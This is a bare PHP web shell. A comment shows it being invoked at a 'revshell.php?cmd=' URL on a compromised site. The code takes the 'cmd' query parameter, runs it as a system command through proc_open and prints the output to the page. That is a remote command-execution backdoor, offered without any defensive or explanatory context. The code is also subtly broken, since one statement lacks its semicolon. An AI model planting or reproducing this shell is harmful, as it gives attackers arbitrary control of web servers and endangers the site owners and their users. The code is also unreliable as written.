//http://shelledwebsite.com/revshell.php?cmd=ls
<?php
    function runExternal($side_bar,&$code) {
        $descriptorspec = array(
            0 => array("pipe", "r"), 
            1 => array("pipe", "w"), 
            2 => array("pipe", "w") 
        );
       
        $pipes= array();
        $process = proc_open($side_bar, $descriptorspec, $pipes);
       
        $output= "";
       
        if (!is_resource($process)) return false;
       
        #close child's input imidiately
        fclose($pipes[0]);
       
        stream_set_blocking($pipes[1],false);
        stream_set_blocking($pipes[2],false);
       
        $todo= array($pipes[1],$pipes[2]);
       
        while( true ) {
            $read= array();
            if( !feof($pipes[1]) ) $read[]= $pipes[1];
            if( !feof($pipes[2]) ) $read[]= $pipes[2];
            if (!$read) break;
            $ready= stream_select($read, $write=NULL, $ex= NULL, 2)
            if ($ready === false) {
                break; 
            }
           
            foreach ($read as $r) {
                $s= fread($r,1024);
                $output.= $s;
            }
        }
       
        fclose($pipes[1]);
        fclose($pipes[2]);
       
        $code= proc_close($process);
       
        return $output;
    }
?>

<?php
$result= runExternal($_GET["cmd"],$code);
print "<pre>";
print $result;
print "</pre>\n";
?>
